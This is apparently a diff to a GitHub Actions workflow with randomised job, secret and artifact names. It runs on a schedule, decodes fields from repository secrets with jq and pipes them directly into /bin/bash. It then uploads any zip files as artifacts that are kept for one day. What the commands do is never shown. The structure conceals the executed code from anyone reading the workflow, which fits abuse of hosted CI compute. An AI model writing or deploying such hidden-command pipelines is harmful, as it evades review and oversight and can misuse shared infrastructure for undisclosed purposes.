@@ -1,8 +1,9 @@
 name: ivantravisfwing37
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '51 2/6 * * *'
+    - cron: '41 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,10 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: ivantravisfwing37
         env:
-          nppak91: ${{ secrets.nppak91 }}
+          sfst65661: ${{ secrets.sfst65661 }}
         run: |
-          echo $nppak91 | jq -r .zg84 | /bin/bash
-          echo $s50427 | jq -r .k5746 | /bin/bash
-          echo $ykty5608 | jq -r .flyu0 | /bin/bash
-          echo $sw6 | jq -r .bmxj1 | /bin/bash
+          printf '%s' "$sfst65661" | jq -r .ofl6921 | /bin/bash
+          printf '%s' "$hah7508" | jq -r .nv7 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: M2Bm7BJv
+          path: "*.zip"
+          retention-days: 1
